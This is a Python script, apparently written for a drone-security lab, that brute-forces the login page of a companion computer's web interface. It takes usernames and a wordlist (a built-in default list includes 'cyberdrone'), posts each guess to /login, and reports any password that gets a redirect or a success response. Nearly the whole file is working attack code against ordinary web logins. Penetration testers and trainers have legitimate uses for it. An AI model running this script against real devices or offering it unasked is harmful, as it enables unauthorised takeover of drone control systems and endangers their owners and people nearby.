#!/usr/bin/env python3
"""
Companion Computer Web UI Brute Force Exploit Script
Performs dictionary attack on companion computer web interface login
"""

import sys
import requests
import time
from urllib.parse import urljoin

def load_wordlist(wordlist_file):
    """
    Load password wordlist from file
    
    Args:
        wordlist_file: Path to wordlist file
    
    Returns:
        List of passwords
    """
    try:
        with open(wordlist_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {wordlist_file}")
        return []
    except Exception as e:
        print(f"[-] Error loading wordlist: {e}")
        return []

def default_wordlist():
    """Return default password list"""
    return [
        'admin', 'password', '123456', '12345678', '1234567890',
        'cyberdrone', 'drone', 'root', 'admin123', 'password123',
        'qwerty', 'abc123', 'letmein', 'welcome', 'monkey',
        'dragon', 'master', 'sunshine', 'shadow', 'passw0rd'
    ]

def brute_force_login(base_url, username='admin', passwords=None, delay=0.5):
    """
    Brute force login on companion computer web interface
    
    Args:
        base_url: Base URL of companion computer (e.g., http://192.168.13.1:3000)
        username: Username to try (default: admin)
        passwords: List of passwords to try
        delay: Delay between attempts in seconds
    
    Returns:
        Tuple of (success, password) or (False, None)
    """
    if passwords is None:
        passwords = default_wordlist()
    
    login_url = urljoin(base_url, '/login')
    
    print(f"[*] Starting brute force attack on {base_url}")
    print(f"[*] Target username: {username}")
    print(f"[*] Trying {len(passwords)} passwords...")
    print()
    
    session = requests.Session()
    
    for i, password in enumerate(passwords, 1):
        try:
            # Try login
            response = session.post(
                login_url,
                data={'username': username, 'password': password},
                timeout=5,
                allow_redirects=False
            )
            
            # Check if login successful (usually redirects or returns 200 with success)
            if response.status_code == 200:
                # Check response content for success indicators
                if 'dashboard' in response.url.lower() or 'home' in response.url.lower():
                    print(f"[+] Login successful!")
                    print(f"[+] Username: {username}")
                    print(f"[+] Password: {password}")
                    return True, password
                # Some systems return 200 with success message
                if 'success' in response.text.lower() or 'welcome' in response.text.lower():
                    print(f"[+] Login successful!")
                    print(f"[+] Username: {username}")
                    print(f"[+] Password: {password}")
                    return True, password
            elif response.status_code == 302:
                # Redirect usually means success
                print(f"[+] Login successful!")
                print(f"[+] Username: {username}")
                print(f"[+] Password: {password}")
                return True, password
            
            print(f"[{i}/{len(passwords)}] Trying password: {password} - Failed")
            time.sleep(delay)
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Error during request: {e}")
            continue
        except KeyboardInterrupt:
            print("\n[*] Brute force interrupted by user")
            break
    
    print("\n[-] Brute force attack completed - no valid credentials found")
    return False, None

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 web_ui_brute_force.py <url> [username] [wordlist_file]")
        print("\nArguments:")
        print("  url            Base URL of companion computer (e.g., http://192.168.13.1:3000)")
        print("  username       Username to try (default: admin)")
        print("  wordlist_file  Path to password wordlist file (optional)")
        print("\nExamples:")
        print("  python3 web_ui_brute_force.py http://192.168.13.1:3000")
        print("  python3 web_ui_brute_force.py http://192.168.13.1:3000 admin")
        print("  python3 web_ui_brute_force.py http://192.168.13.1:3000 admin passwords.txt")
        sys.exit(1)
    
    base_url = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else 'admin'
    wordlist_file = sys.argv[3] if len(sys.argv) > 3 else None
    
    # Load wordlist
    if wordlist_file:
        passwords = load_wordlist(wordlist_file)
        if not passwords:
            print("[!] Using default wordlist")
            passwords = default_wordlist()
    else:
        passwords = default_wordlist()
    
    # Perform brute force attack
    success, password = brute_force_login(base_url, username, passwords)
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
